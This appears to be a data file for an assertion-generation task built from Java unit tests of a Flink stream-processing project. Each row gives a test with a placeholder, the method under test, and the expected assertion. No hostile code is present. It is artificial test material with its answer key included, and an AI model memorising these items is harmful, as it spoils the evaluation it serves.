build() { DaggerDeserializer<Row> daggerDeserializer = DaggerDeserializerFactory.create(streamConfig, configuration, stencilClientOrchestrator, statsDReporterSupplier); DaggerSource<Row> daggerSource = DaggerSourceFactory.create(streamConfig, configuration, daggerDeserializer, statsDReporterSupplier); return new Stream(daggerSource, streamConfig.getSchemaTable()); }"	assertTrue(stream.getDaggerSource() instanceof FlinkKafkaConsumerDaggerSource)
"shouldBeAbleToBuildAStreamWithKafkaDaggerSourceAndJsonSchema() { when(streamConfig.getSourceDetails()).thenReturn(new SourceDetails[]{new SourceDetails(SourceName.KAFKA_SOURCE, SourceType.UNBOUNDED)}); when(streamConfig.getDataType()).thenReturn(""JSON""); when(streamConfig.getSchemaTable()).thenReturn(""data_stream""); when(streamConfig.getJsonSchema()).thenReturn(""{ ""$schema"": ""https://json-schema.org/draft/2020-12/schema"", ""$id"": ""https://example.com/product.schema.json"", ""title"": ""Product"", ""description"": ""A product from Acme's catalog"", ""type"": ""object"", ""properties"": { ""id"": { ""description"": ""The unique identifier for a product"", ""type"": ""string"" }, ""time"": { ""description"": ""event timestamp of the event"", ""type"": ""string"", ""format"" : ""date-time"" } }, ""required"": [ ""id"", ""time"" ] }"");  Stream.Builder builder = new Stream.Builder(streamConfig, configuration, stencilClientOrchestrator, statsDReporterSupplierMock); Stream stream = builder.build();  ""<AssertPlaceHolder>""; }
build() { DaggerDeserializer<Row> daggerDeserializer = DaggerDeserializerFactory.create(streamConfig, configuration, stencilClientOrchestrator, statsDReporterSupplier); DaggerSource<Row> daggerSource = DaggerSourceFactory.create(streamConfig, configuration, daggerDeserializer, statsDReporterSupplier); return new Stream(daggerSource, streamConfig.getSchemaTable()); }"	assertTrue(stream.getDaggerSource() instanceof KafkaDaggerSource)
"shouldBeAbleToBuildAStreamWithFlinkKafkaConsumerDaggerSourceAndJsonSchema() { when(streamConfig.getSourceDetails()).thenReturn(new SourceDetails[]{new SourceDetails(SourceName.KAFKA_CONSUMER, SourceType.UNBOUNDED)}); when(streamConfig.getDataType()).thenReturn(""JSON""); when(streamConfig.getSchemaTable()).thenReturn(""data_stream""); when(streamConfig.getJsonSchema()).thenReturn(""{ ""$schema"": ""https://json-schema.org/draft/2020-12/schema"", ""$id"": ""https://example.com/product.schema.json"", ""title"": ""Product"", ""description"": ""A product from Acme's catalog"", ""type"": ""object"", ""properties"": { ""id"": { ""description"": ""The unique identifier for a product"", ""type"": ""string"" }, ""time"": { ""description"": ""event timestamp of the event"", ""type"": ""string"", ""format"" : ""date-time"" } }, ""required"": [ ""id"", ""time"" ] }"");  Stream.Builder builder = new Stream.Builder(streamConfig, configuration, stencilClientOrchestrator, statsDReporterSupplierMock); Stream stream = builder.build();  ""<AssertPlaceHolder>""; }
build() { DaggerDeserializer<Row> daggerDeserializer = DaggerDeserializerFactory.create(streamConfig, configuration, stencilClientOrchestrator, statsDReporterSupplier); DaggerSource<Row> daggerSource = DaggerSourceFactory.create(streamConfig, configuration, daggerDeserializer, statsDReporterSupplier); return new Stream(daggerSource, streamConfig.getSchemaTable()); }"	assertTrue(stream.getDaggerSource() instanceof FlinkKafkaConsumerDaggerSource)
"shouldBeAbleToBuildAStreamWithParquetDaggerSourceAndProtoSchema() { when(streamConfig.getSourceDetails()).thenReturn(new SourceDetails[]{new SourceDetails(SourceName.PARQUET_SOURCE, SourceType.BOUNDED)}); when(streamConfig.getEventTimestampFieldIndex()).thenReturn(""5""); when(streamConfig.getDataType()).thenReturn(""PROTO""); when(streamConfig.getProtoClass()).thenReturn(""com.tests.TestMessage""); when(streamConfig.getSchemaTable()).thenReturn(""data_stream""); when(stencilClientOrchestrator.getStencilClient()).thenReturn(stencilClient); when(stencilClient.get(""com.tests.TestMessage"")).thenReturn(TestBookingLogMessage.getDescriptor()); Stream.Builder builder = new Stream.Builder(streamConfig, configuration, stencilClientOrchestrator, statsDReporterSupplierMock); Stream stream = builder.build();  ""<AssertPlaceHolder>""; }
build() { DaggerDeserializer<Row> daggerDeserializer = DaggerDeserializerFactory.create(streamConfig, configuration, stencilClientOrchestrator, statsDReporterSupplier); DaggerSource<Row> daggerSource = DaggerSourceFactory.create(streamConfig, configuration, daggerDeserializer, statsDReporterSupplier); return new Stream(daggerSource, streamConfig.getSchemaTable()); }"	assertTrue(stream.getDaggerSource() instanceof ParquetDaggerSource)
"IOException { when(jsonReader.nextString()).thenReturn(""SCRAM-SHA-512""); DaggerSASLMechanismAdaptor daggerSASLMechanismAdaptor = new DaggerSASLMechanismAdaptor(); String saslMechanism = daggerSASLMechanismAdaptor.read(jsonReader); ""<AssertPlaceHolder>""; }
read(JsonReader jsonReader) throws IOException { String saslMechanism = jsonReader.nextString(); if (Arrays.stream(Constants.SUPPORTED_SOURCE_KAFKA_CONSUMER_CONFIG_SASL_MECHANISM).anyMatch(saslMechanism::equals)) { return saslMechanism; } else { throw new InvalidConfigurationException(String.format(""Configured wrong SOURCE_KAFKA_CONSUMER_CONFIG_SASL_MECHANISM supported values are %s"", Arrays.toString(Constants.SUPPORTED_SOURCE_KAFKA_CONSUMER_CONFIG_SASL_MECHANISM))); } }"	"assertEquals(""SCRAM-SHA-512"", saslMechanism)"
"IOException { when(jsonReader.nextString()).thenReturn(""SASL_PLAINTEXT""); DaggerSecurityProtocolAdaptor daggerSecurityProtocolAdaptor = new DaggerSecurityProtocolAdaptor(); String securityProtocol = daggerSecurityProtocolAdaptor.read(jsonReader); ""<AssertPlaceHolder>""; }
read(JsonReader jsonReader) throws IOException { String securityProtocol = jsonReader.nextString(); if (Arrays.stream(Constants.SUPPORTED_SOURCE_KAFKA_CONSUMER_CONFIG_SECURITY_PROTOCOL).anyMatch(securityProtocol::equals)) { return securityProtocol; } else { throw new InvalidConfigurationException(String.format(""Configured wrong SOURCE_KAFKA_CONSUMER_CONFIG_SECURITY_PROTOCOL supported values are %s"", Arrays.toString(Constants.SUPPORTED_SOURCE_KAFKA_CONSUMER_CONFIG_SECURITY_PROTOCOL))); } }"	"assertEquals(""SASL_PLAINTEXT"", securityProtocol)"
"IOException { String storeFileType = ""JKS""; when(jsonReader.nextString()).thenReturn(storeFileType); DaggerSSLKeyStoreFileTypeAdaptor daggerSSLKeyStoreFileTypeAdaptor = new DaggerSSLKeyStoreFileTypeAdaptor(); String keystoreFileType = daggerSSLKeyStoreFileTypeAdaptor.read(jsonReader); ""<AssertPlaceHolder>""; }
read(JsonReader jsonReader) throws IOException { String keyStoreFileType = jsonReader.nextString(); if (Arrays.stream(Constants.SUPPORTED_SOURCE_KAFKA_CONSUMER_CONFIG_SSL_STORE_FILE_TYPE).anyMatch(keyStoreFileType::equals)) { return keyStoreFileType; } else { throw new InvalidConfigurationException(String.format(""Configured wrong SOURCE_KAFKA_CONSUMER_CONFIG_SSL_KEYSTORE_TYPE_KEY supported values are %s"", Arrays.toString(Constants.SUPPORTED_SOURCE_KAFKA_CONSUMER_CONFIG_SSL_STORE_FILE_TYPE))); } }"	assertEquals(storeFileType, keystoreFileType)
"IOException { when(jsonReader.nextString()).thenReturn(""SSL""); DaggerSSLProtocolAdaptor daggerSSLProtocolAdaptor = new DaggerSSLProtocolAdaptor(); String sslProtocol = daggerSSLProtocolAdaptor.read(jsonReader); ""<AssertPlaceHolder>""; }
read(JsonReader jsonReader) throws IOException { String sslProtocol = jsonReader.nextString(); if (Arrays.stream(Constants.SUPPORTED_SOURCE_KAFKA_CONSUMER_CONFIG_SSL_PROTOCOL).anyMatch(sslProtocol::equals)) { return sslProtocol; } else { throw new InvalidConfigurationException(String.format(""Configured wrong SOURCE_KAFKA_CONSUMER_CONFIG_SSL_PROTOCOL supported values are %s"", Arrays.toString(Constants.SUPPORTED_SOURCE_KAFKA_CONSUMER_CONFIG_SSL_PROTOCOL))); } }"	"assertEquals(""SSL"", sslProtocol)"
"IOException { String storeFileType = ""JKS""; when(jsonReader.nextString()).thenReturn(storeFileType); DaggerSSLTrustStoreFileTypeAdaptor daggerSSLTrustStoreFileTypeAdaptor = new DaggerSSLTrustStoreFileTypeAdaptor(); String truststoreFileType = daggerSSLTrustStoreFileTypeAdaptor.read(jsonReader); ""<AssertPlaceHolder>""; }
read(JsonReader jsonReader) throws IOException { String trustStoreFileType = jsonReader.nextString(); if (Arrays.stream(Constants.SUPPORTED_SOURCE_KAFKA_CONSUMER_CONFIG_SSL_STORE_FILE_TYPE).anyMatch(trustStoreFileType::equals)) { return trustStoreFileType; } else { throw new InvalidConfigurationException(String.format(""Configured wrong SOURCE_KAFKA_CONSUMER_CONFIG_SSL_TRUSTSTORE_TYPE_KEY supported values are %s"", Arrays.toString(Constants.SUPPORTED_SOURCE_KAFKA_CONSUMER_CONFIG_SSL_STORE_FILE_TYPE))); } }"	assertEquals(storeFileType, truststoreFileType)
"shouldReturnTrueIfInstantFallsBetweenAnyTimeRange() { TimeRangePool timeRangePool = new TimeRangePool(); timeRangePool.add(new TimeRange(Instant.parse(""2022-02-13T04:00:00Z""), Instant.parse(""2022-02-13T07:59:00Z""))); timeRangePool.add(new TimeRange(Instant.parse(""2022-02-13T14:00:00Z""), Instant.parse(""2022-02-13T17:59:00Z""))); timeRangePool.add(new TimeRange(Instant.parse(""2022-02-13T19:00:00Z""), Instant.parse(""2022-02-13T20:59:00Z"")));  ""<AssertPlaceHolder>""; }
contains(Instant instant) { return timeRanges.stream().anyMatch(timeRange -> timeRange.contains(instant)); }"	"assertTrue(timeRangePool.contains(Instant.parse(""2022-02-13T15:00:00Z"")))"
"shouldReturnTrueIfInstantFallsBetweenAllTimeRange() { TimeRangePool timeRangePool = new TimeRangePool(); timeRangePool.add(new TimeRange(Instant.parse(""2022-02-13T04:00:00Z""), Instant.parse(""2022-02-13T07:59:00Z""))); timeRangePool.add(new TimeRange(Instant.parse(""2022-02-13T07:59:00Z""), Instant.parse(""2022-02-13T08:59:00Z"")));  ""<AssertPlaceHolder>""; }
contains(Instant instant) { return timeRanges.stream().anyMatch(timeRange -> timeRange.contains(instant)); }"	"assertTrue(timeRangePool.contains(Instant.parse(""2022-02-13T07:59:00Z"")))"
"shouldReturnFalseIfInstantDoesNotFallBetweenAnyTimeRange() { TimeRangePool timeRangePool = new TimeRangePool(); timeRangePool.add(new TimeRange(Instant.parse(""2022-02-13T04:00:00Z""), Instant.parse(""2022-02-13T07:59:00Z""))); timeRangePool.add(new TimeRange(Instant.parse(""2022-02-13T14:00:00Z""), Instant.parse(""2022-02-13T17:59:00Z""))); timeRangePool.add(new TimeRange(Instant.parse(""2022-02-13T19:00:00Z""), Instant.parse(""2022-02-13T20:59:00Z"")));  ""<AssertPlaceHolder>""; }
contains(Instant instant) { return timeRanges.stream().anyMatch(timeRange -> timeRange.contains(instant)); }"	"assertFalse(timeRangePool.contains(Instant.parse(""2022-02-13T23:00:00Z"")))"
"shouldReturnTrueIfInstantIsBetweenStartAndEndTime() { TimeRange timeRange = new TimeRange(Instant.parse(""2022-02-13T14:00:00Z""), Instant.parse(""2022-02-13T17:59:00Z"")); ""<AssertPlaceHolder>""; }
contains(Instant instant) { return instant.equals(startInstant) || instant.equals(endInstant) || (instant.isAfter(startInstant) && instant.isBefore(endInstant)); }"	"assertTrue(timeRange.contains(Instant.parse(""2022-02-13T15:00:00Z"")))"
"shouldReturnTrueIfInstantIsEqualToStartTime() { TimeRange timeRange = new TimeRange(Instant.parse(""2022-02-13T14:00:00Z""), Instant.parse(""2022-02-13T17:59:00Z"")); ""<AssertPlaceHolder>""; }
contains(Instant instant) { return instant.equals(startInstant) || instant.equals(endInstant) || (instant.isAfter(startInstant) && instant.isBefore(endInstant)); }"	"assertTrue(timeRange.contains(Instant.parse(""2022-02-13T14:00:00Z"")))"
"shouldReturnTrueIfInstantIsEqualToEndTime() { TimeRange timeRange = new TimeRange(Instant.parse(""2022-02-13T14:00:00Z""), Instant.parse(""2022-02-13T17:59:00Z"")); ""<AssertPlaceHolder>""; }
contains(Instant instant) { return instant.equals(startInstant) || instant.equals(endInstant) || (instant.isAfter(startInstant) && instant.isBefore(endInstant)); }"	"assertTrue(timeRange.contains(Instant.parse(""2022-02-13T17:59:00Z"")))"
"shouldReturnFalseIfInstantIsBeforeStartTime() { TimeRange timeRange = new TimeRange(Instant.parse(""2022-02-13T14:00:00Z""), Instant.parse(""2022-02-13T17:59:00Z"")); ""<AssertPlaceHolder>""; }
contains(Instant instant) { return instant.equals(startInstant) || instant.equals(endInstant) || (instant.isAfter(startInstant) && instant.isBefore(endInstant)); }"	"assertFalse(timeRange.contains(Instant.parse(""2022-02-13T12:00:00Z"")))"
"shouldReturnFalseIfInstantIsAfterEndTime() { TimeRange timeRange = new TimeRange(Instant.parse(""2022-02-13T14:00:00Z""), Instant.parse(""2022-02-13T17:59:00Z"")); ""<AssertPlaceHolder>""; }
contains(Instant instant) { return instant.equals(startInstant) || instant.equals(endInstant) || (instant.isAfter(startInstant) && instant.isBefore(endInstant)); }"	"assertFalse(timeRange.contains(Instant.parse(""2022-02-13T19:00:00Z"")))"
"shouldReturnErrorStatsReporter() { when(configuration.getLong(Constants.METRIC_TELEMETRY_SHUTDOWN_PERIOD_MS_KEY, Constants.METRIC_TELEMETRY_SHUTDOWN_PERIOD_MS_DEFAULT)).thenReturn(0L); when(configuration.getBoolean(Constants.METRIC_TELEMETRY_ENABLE_KEY, Constants.METRIC_TELEMETRY_ENABLE_VALUE_DEFAULT)).thenReturn(true); ErrorReporter expectedErrorStatsReporter = ErrorReporterFactory.getErrorReporter(defaultRuntimeContext.getMetricGroup(), configuration); FlinkKafkaConsumerCustom flinkKafkaConsumerCustom = new FlinkKafkaConsumerCustom(Pattern.compile(""test_topics""), kafkaDeserializationSchema, properties, configuration); ""<AssertPlaceHolder>""; }
getErrorReporter(RuntimeContext runtimeContext) { return ErrorReporterFactory.getErrorReporter(runtimeContext.getMetricGroup(), configuration); }"	assertEquals(expectedErrorStatsReporter.getClass(), flinkKafkaConsumerCustom.getErrorReporter(defaultRuntimeContext).getClass())
"shouldBeAbleToBuildSourceIfSourceDetailsIsUnboundedKafkaConsumerAndDaggerDeserializerIsKafkaDeserializationSchema() { when(streamConfig.getSourceDetails()).thenReturn(new SourceDetails[]{new SourceDetails(SourceName.KAFKA_CONSUMER, SourceType.UNBOUNDED)}); FlinkKafkaConsumerDaggerSource daggerSource = new FlinkKafkaConsumerDaggerSource(streamConfig, configuration, daggerDeserializer);  ""<AssertPlaceHolder>""; }
canBuild() { SourceDetails[] sourceDetailsArray = streamConfig.getSourceDetails(); if (sourceDetailsArray.length != 1) { return false; } else { SourceName sourceName = sourceDetailsArray[0].getSourceName(); SourceType sourceType = sourceDetailsArray[0].getSourceType(); return sourceName.equals(SUPPORTED_SOURCE_NAME) && sourceType.equals(SUPPORTED_SOURCE_TYPE) && deserializer instanceof KafkaDeserializationSchema; } }"	assertTrue(daggerSource.canBuild())
"shouldNotBeAbleToBuildSourceIfSourceDetailsContainsMultipleBackToBackSources() { when(streamConfig.getSourceDetails()).thenReturn(new SourceDetails[]{new SourceDetails(SourceName.KAFKA_CONSUMER, SourceType.UNBOUNDED), new SourceDetails(SourceName.KAFKA_CONSUMER, SourceType.UNBOUNDED)}); FlinkKafkaConsumerDaggerSource daggerSource = new FlinkKafkaConsumerDaggerSource(streamConfig, configuration, daggerDeserializer);  ""<AssertPlaceHolder>""; }
canBuild() { SourceDetails[] sourceDetailsArray = streamConfig.getSourceDetails(); if (sourceDetailsArray.length != 1) { return false; } else { SourceName sourceName = sourceDetailsArray[0].getSourceName(); SourceType sourceType = sourceDetailsArray[0].getSourceType(); return sourceName.equals(SUPPORTED_SOURCE_NAME) && sourceType.equals(SUPPORTED_SOURCE_TYPE) && deserializer instanceof KafkaDeserializationSchema; } }"	assertFalse(daggerSource.canBuild())
"shouldNotBeAbleToBuildSourceIfSourceNameIsUnsupported() { when(streamConfig.getSourceDetails()).thenReturn(new SourceDetails[]{new SourceDetails(SourceName.PARQUET_SOURCE, SourceType.UNBOUNDED)}); FlinkKafkaConsumerDaggerSource daggerSource = new FlinkKafkaConsumerDaggerSource(streamConfig, configuration, daggerDeserializer);  ""<AssertPlaceHolder>""; }
canBuild() { SourceDetails[] sourceDetailsArray = streamConfig.getSourceDetails(); if (sourceDetailsArray.length != 1) { return false; } else { SourceName sourceName = sourceDetailsArray[0].getSourceName(); SourceType sourceType = sourceDetailsArray[0].getSourceType(); return sourceName.equals(SUPPORTED_SOURCE_NAME) && sourceType.equals(SUPPORTED_SOURCE_TYPE) && deserializer instanceof KafkaDeserializationSchema; } }"	assertFalse(daggerSource.canBuild())
"shouldNotBeAbleToBuildSourceIfSourceTypeIsUnsupported() { when(streamConfig.getSourceDetails()).thenReturn(new SourceDetails[]{new SourceDetails(SourceName.KAFKA_CONSUMER, SourceType.BOUNDED)}); FlinkKafkaConsumerDaggerSource daggerSource = new FlinkKafkaConsumerDaggerSource(streamConfig, configuration, daggerDeserializer);  ""<AssertPlaceHolder>""; }
canBuild() { SourceDetails[] sourceDetailsArray = streamConfig.getSourceDetails(); if (sourceDetailsArray.length != 1) { return false; } else { SourceName sourceName = sourceDetailsArray[0].getSourceName(); SourceType sourceType = sourceDetailsArray[0].getSourceType(); return sourceName.equals(SUPPORTED_SOURCE_NAME) && sourceType.equals(SUPPORTED_SOURCE_TYPE) && deserializer instanceof KafkaDeserializationSchema; } }"	assertFalse(daggerSource.canBuild())
"shouldNotBeAbleToBuildSourceIfDeserializerTypeIsUnsupported() { DaggerDeserializer<Row> unsupportedDeserializer = Mockito.mock(SimpleGroupDeserializer.class); when(streamConfig.getSourceDetails()).thenReturn(new SourceDetails[]{new SourceDetails(SourceName.KAFKA_CONSUMER, SourceType.UNBOUNDED)}); FlinkKafkaConsumerDaggerSource daggerSource = new FlinkKafkaConsumerDaggerSource(streamConfig, configuration, unsupportedDeserializer);  ""<AssertPlaceHolder>""; }
canBuild() { SourceDetails[] sourceDetailsArray = streamConfig.getSourceDetails(); if (sourceDetailsArray.length != 1) { return false; } else { SourceName sourceName = sourceDetailsArray[0].getSourceName(); SourceType sourceType = sourceDetailsArray[0].getSourceType(); return sourceName.equals(SUPPORTED_SOURCE_NAME) && sourceType.equals(SUPPORTED_SOURCE_TYPE) && deserializer instanceof KafkaDeserializationSchema; } }"	assertFalse(daggerSource.canBuild())
"shouldBeAbleToBuildSourceIfSourceDetailsIsUnboundedKafkaAndDaggerDeserializerIsKafkaDeserializationSchema() { when(streamConfig.getSourceDetails()).thenReturn(new SourceDetails[]{new SourceDetails(SourceName.KAFKA_SOURCE, SourceType.UNBOUNDED)}); KafkaDaggerSource daggerSource = new KafkaDaggerSource(streamConfig, configuration, daggerDeserializer);  ""<AssertPlaceHolder>""; }
canBuild() { SourceDetails[] sourceDetailsArray = streamConfig.getSourceDetails(); if (sourceDetailsArray.length != 1) { return false; } else { SourceName sourceName = sourceDetailsArray[0].getSourceName(); SourceType sourceType = sourceDetailsArray[0].getSourceType(); return sourceName.equals(SUPPORTED_SOURCE_NAME) && sourceType.equals(SUPPORTED_SOURCE_TYPE) && deserializer instanceof KafkaDeserializationSchema; } }"	assertTrue(daggerSource.canBuild())
"shouldNotBeAbleToBuildSourceIfSourceDetailsContainsMultipleBackToBackSources() { when(streamConfig.getSourceDetails()).thenReturn(new SourceDetails[]{new SourceDetails(SourceName.KAFKA_SOURCE, SourceType.UNBOUNDED), new SourceDetails(SourceName.KAFKA_SOURCE, SourceType.UNBOUNDED)}); KafkaDaggerSource daggerSource = new KafkaDaggerSource(streamConfig, configuration, daggerDeserializer);  ""<AssertPlaceHolder>""; }
canBuild() { SourceDetails[] sourceDetailsArray = streamConfig.getSourceDetails(); if (sourceDetailsArray.length != 1) { return false; } else { SourceName sourceName = sourceDetailsArray[0].getSourceName(); SourceType sourceType = sourceDetailsArray[0].getSourceType(); return sourceName.equals(SUPPORTED_SOURCE_NAME) && sourceType.equals(SUPPORTED_SOURCE_TYPE) && deserializer instanceof KafkaDeserializationSchema; } }"	assertFalse(daggerSource.canBuild())
"shouldNotBeAbleToBuildSourceIfSourceNameIsUnsupported() { when(streamConfig.getSourceDetails()).thenReturn(new SourceDetails[]{new SourceDetails(SourceName.PARQUET_SOURCE, SourceType.UNBOUNDED)}); KafkaDaggerSource daggerSource = new KafkaDaggerSource(streamConfig, configuration, daggerDeserializer);  ""<AssertPlaceHolder>""; }
canBuild() { SourceDetails[] sourceDetailsArray = streamConfig.getSourceDetails(); if (sourceDetailsArray.length != 1) { return false; } else { SourceName sourceName = sourceDetailsArray[0].getSourceName(); SourceType sourceType = sourceDetailsArray[0].getSourceType(); return sourceName.equals(SUPPORTED_SOURCE_NAME) && sourceType.equals(SUPPORTED_SOURCE_TYPE) && deserializer instanceof KafkaDeserializationSchema; } }"	assertFalse(daggerSource.canBuild())
"shouldNotBeAbleToBuildSourceIfSourceTypeIsUnsupported() { when(streamConfig.getSourceDetails()).thenReturn(new SourceDetails[]{new SourceDetails(SourceName.KAFKA_SOURCE, SourceType.BOUNDED)}); KafkaDaggerSource daggerSource = new KafkaDaggerSource(streamConfig, configuration, daggerDeserializer);  ""<AssertPlaceHolder>""; }
canBuild() { SourceDetails[] sourceDetailsArray = streamConfig.getSourceDetails(); if (sourceDetailsArray.length != 1) { return false; } else { SourceName sourceName = sourceDetailsArray[0].getSourceName(); SourceType sourceType = sourceDetailsArray[0].getSourceType(); return sourceName.equals(SUPPORTED_SOURCE_NAME) && sourceType.equals(SUPPORTED_SOURCE_TYPE) && deserializer instanceof KafkaDeserializationSchema; } }"	assertFalse(daggerSource.canBuild())
"shouldNotBeAbleToBuildSourceIfDeserializerTypeIsUnsupported() { DaggerDeserializer<Row> unsupportedDeserializer = Mockito.mock(SimpleGroupDeserializer.class); when(streamConfig.getSourceDetails()).thenReturn(new SourceDetails[]{new SourceDetails(SourceName.KAFKA_SOURCE, SourceType.UNBOUNDED)}); KafkaDaggerSource daggerSource = new KafkaDaggerSource(streamConfig, configuration, unsupportedDeserializer);  ""<AssertPlaceHolder>""; }
canBuild() { SourceDetails[] sourceDetailsArray = streamConfig.getSourceDetails(); if (sourceDetailsArray.length != 1) { return false; } else { SourceName sourceName = sourceDetailsArray[0].getSourceName(); SourceType sourceType = sourceDetailsArray[0].getSourceType(); return sourceName.equals(SUPPORTED_SOURCE_NAME) && sourceType.equals(SUPPORTED_SOURCE_TYPE) && deserializer instanceof KafkaDeserializationSchema; } }"	assertFalse(daggerSource.canBuild())
"ParseException { Path path = new Path(""gs://my-bucket/bid-log/dt=2019-10-12/hr=03/file"");  HourDatePathParser hourDatePathParser = new HourDatePathParser();  Instant instant = hourDatePathParser.instantFromFilePath(path);  ""<AssertPlaceHolder>""; }
instantFromFilePath(Path path) throws ParseException { Pattern filePathPattern = Pattern.compile(""^.*/dt=([0-9][0-9][0-9][0-9]-[0-9][0-9]-[0-9][0-9])/(hr=([0-9][0-9]))?.*$""); Matcher matcher = filePathPattern.matcher(path.toString()); final int hourMatcherGroupNumber = 3; final int dateMatcherGroupNumber = 1; boolean matchFound = matcher.find(); if (matchFound && matcher.group(hourMatcherGroupNumber) != null && matcher.group(dateMatcherGroupNumber) != null) { return convertToInstant(matcher.group(dateMatcherGroupNumber), matcher.group(hourMatcherGroupNumber)); } else if (matchFound && matcher.group(hourMatcherGroupNumber) == null && matcher.group(dateMatcherGroupNumber) != null) { return convertToInstant(matcher.group(dateMatcherGroupNumber)); } else { String message = String.format(""Cannot extract timestamp from filepath for deciding order of processing.\n"" + ""File path doesn't abide with any partitioning strategy: %s"", path); throw new ParseException(message, 0); } }"	assertEquals(1570849200, instant.getEpochSecond())
"ParseException { Path path = new Path(""gs://my-bucket/bid-log/dt=2019-10-12/file"");  HourDatePathParser hourDatePathParser = new HourDatePathParser();  Instant instant = hourDatePathParser.instantFromFilePath(path);  ""<AssertPlaceHolder>""; }
instantFromFilePath(Path path) throws ParseException { Pattern filePathPattern = Pattern.compile(""^.*/dt=([0-9][0-9][0-9][0-9]-[0-9][0-9]-[0-9][0-9])/(hr=([0-9][0-9]))?.*$""); Matcher matcher = filePathPattern.matcher(path.toString()); final int hourMatcherGroupNumber = 3; final int dateMatcherGroupNumber = 1; boolean matchFound = matcher.find(); if (matchFound && matcher.group(hourMatcherGroupNumber) != null && matcher.group(dateMatcherGroupNumber) != null) { return convertToInstant(matcher.group(dateMatcherGroupNumber), matcher.group(hourMatcherGroupNumber)); } else if (matchFound && matcher.group(hourMatcherGroupNumber) == null && matcher.group(dateMatcherGroupNumber) != null) { return convertToInstant(matcher.group(dateMatcherGroupNumber)); } else { String message = String.format(""Cannot extract timestamp from filepath for deciding order of processing.\n"" + ""File path doesn't abide with any partitioning strategy: %s"", path); throw new ParseException(message, 0); } }"	assertEquals(1570838400, instant.getEpochSecond())
"IOException { when(deserializer.deserialize(any(SimpleGroup.class))).thenReturn(Row.of(""same"", ""deserializer"")); ParquetReader.ParquetReaderProvider provider = new ParquetReader.ParquetReaderProvider(deserializer, statsDReporterSupplierMock); ClassLoader classLoader = getClass().getClassLoader();  String filePath1 = classLoader.getResource(""test_file.parquet"").getPath(); ParquetReader reader1 = provider.getReader(filePath1);  String filePath2 = classLoader.getResource(""multiple_row_groups_test_file.parquet"").getPath(); ParquetReader reader2 = provider.getReader(filePath2);  ""<AssertPlaceHolder>""; }
read() throws IOException { if (!isRecordReaderInitialized) { initializeRecordReader(); } Row row = readRecords(); daggerCounterManager.increment(ParquetReaderAspects.READER_ROWS_EMITTED); return row; }"	assertEquals(reader1.read(), reader2.read())
"shouldReturnCheckPointedPositionWithNoOffsetAndZeroRecordsAfterOffsetWhenReadHasNotBeenCalledYet() { ParquetReader.ParquetReaderProvider provider = new ParquetReader.ParquetReaderProvider(deserializer, statsDReporterSupplierMock); ClassLoader classLoader = getClass().getClassLoader(); ParquetReader reader = provider.getReader(classLoader.getResource(""test_file.parquet"").getPath());  CheckpointedPosition expectedCheckpointedPosition = new CheckpointedPosition(CheckpointedPosition.NO_OFFSET, 0);  ""<AssertPlaceHolder>""; }
getCheckpointedPosition() { return new CheckpointedPosition(CheckpointedPosition.NO_OFFSET, totalEmittedRowCount); }"	assertEquals(expectedCheckpointedPosition, reader.getCheckpointedPosition())
"IOException { ParquetReader.ParquetReaderProvider provider = new ParquetReader.ParquetReaderProvider(deserializer, statsDReporterSupplierMock); ClassLoader classLoader = getClass().getClassLoader(); ParquetReader reader = provider.getReader(classLoader.getResource(""test_file.parquet"").getPath());  reader.read(); reader.read(); reader.read(); /* This 4th call to read will return null as there are only 3 rows in test_file.parquet */ reader.read();  CheckpointedPosition expectedCheckpointedPosition = new CheckpointedPosition(CheckpointedPosition.NO_OFFSET, 3);  ""<AssertPlaceHolder>""; }
getCheckpointedPosition() { return new CheckpointedPosition(CheckpointedPosition.NO_OFFSET, totalEmittedRowCount); }"	assertEquals(expectedCheckpointedPosition, reader.getCheckpointedPosition())
"shouldReturnEmptyOptionalWhenNoMoreSplitsToReturn() { FileSourceSplit firstSplit = new FileSourceSplit(""1"", new Path(""gs://my-bucket/bid-log/dt=2019-10-12/shs6s5sdg""), 0, 1024); List<FileSourceSplit> inputSplits = Arrays.asList(firstSplit);  ChronologyOrderedSplitAssigner.ChronologyOrderedSplitAssignerBuilder splitAssignerBuilder = new ChronologyOrderedSplitAssigner.ChronologyOrderedSplitAssignerBuilder();  ChronologyOrderedSplitAssigner splitAssigner = splitAssignerBuilder. addPathParser(new HourDatePathParser()) .addStatsDReporterSupplier(statsDReporterSupplierMock) .build(inputSplits);  splitAssigner.getNext(null); Optional<FileSourceSplit> nextSplit = splitAssigner.getNext(null);  ""<AssertPlaceHolder>""; }
getNext(@Nullable String hostname) { InstantEnrichedSplit instantEnrichedSplit = unassignedSplits.poll(); if (instantEnrichedSplit == null) { return Optional.empty(); } daggerGaugeManager.markValue(ChronologyOrderedSplitAssignerAspects.SPLITS_AWAITING_ASSIGNMENT, unassignedSplits.size()); return Optional.of(instantEnrichedSplit.getFileSourceSplit()); }"	assertFalse(nextSplit.isPresent())
"shouldReturnRemainingSplitsWhichAreNotAssignedYetInAscendingOrderOfFilePathTimestampURL() { FileSourceSplit firstSplit = new FileSourceSplit(""1"", new Path(""gs://my-bucket/bid-log/dt=2019-10-12/asdghsdhasd""), 0, 1024); FileSourceSplit secondSplit = new FileSourceSplit(""1"", new Path(""gs://my-bucket/bid-log/dt=2020-02-29/ga6agad6ad""), 0, 1024); FileSourceSplit thirdSplit = new FileSourceSplit(""1"", new Path(""gs://my-bucket/bid-log/dt=2020-11-31/hd7ahadh7agd""), 0, 1024); FileSourceSplit fourthSplit = new FileSourceSplit(""1"", new Path(""gs://my-bucket/bid-log/dt=2020-12-31/hagga6a36dg""), 0, 1024); List<FileSourceSplit> inputSplits = Arrays.asList(secondSplit, fourthSplit, firstSplit, thirdSplit);  ChronologyOrderedSplitAssigner.ChronologyOrderedSplitAssignerBuilder splitAssignerBuilder = new ChronologyOrderedSplitAssigner.ChronologyOrderedSplitAssignerBuilder();  ChronologyOrderedSplitAssigner splitAssigner = splitAssignerBuilder .addPathParser(new HourDatePathParser()) .addStatsDReporterSupplier(statsDReporterSupplierMock) .build(inputSplits); splitAssigner.getNext(null); List<FileSourceSplit> remainingSplits = (List<FileSourceSplit>) splitAssigner.remainingSplits();  FileSourceSplit[] expectedSplits = new FileSourceSplit[]{secondSplit, thirdSplit, fourthSplit}; for (int i = 0; i < 3; i++) { ""<AssertPlaceHolder>""; } }
remainingSplits() { return unassignedSplits .stream() .map(InstantEnrichedSplit::getFileSourceSplit) .collect(Collectors.toList()); }"	"assertEquals(""AssertionError when testing for file split number "" + (i + 1), expectedSplits[i], remainingSplits.get(i))"
